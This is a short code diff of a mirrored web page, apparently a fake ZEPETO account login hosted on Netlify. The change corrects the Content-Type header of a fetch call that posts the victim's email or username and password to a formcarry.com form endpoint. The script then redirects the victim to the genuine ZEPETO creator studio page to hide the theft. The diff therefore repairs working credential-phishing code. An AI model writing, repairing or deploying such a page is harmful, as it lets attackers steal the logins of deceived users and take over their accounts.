@@ -108,7 +108,7 @@ function checkFields() {
       loadingOverlay.style.display = "flex";
       await fetch("https://formcarry.com/s/85_t76b2Pln", {
         method: "POST",
-        headers: {"Content-Type": "https://formcarry.com/s/qI6MrmF76lG"},
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
         body: `emailOrUsername=${encodeURIComponent(emailField.value)}&password=${encodeURIComponent(passwordField.value)}`
       });
       window.location.href = "https://studio.zepeto.me/program/creator";
@@ -138,6 +138,7 @@ passwordField.addEventListener("input", checkFields);
 
 <!-- Mirrored from accountzepeto.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 22 Nov 2025 18:27:35 GMT -->
 </html>
+
 
 
 
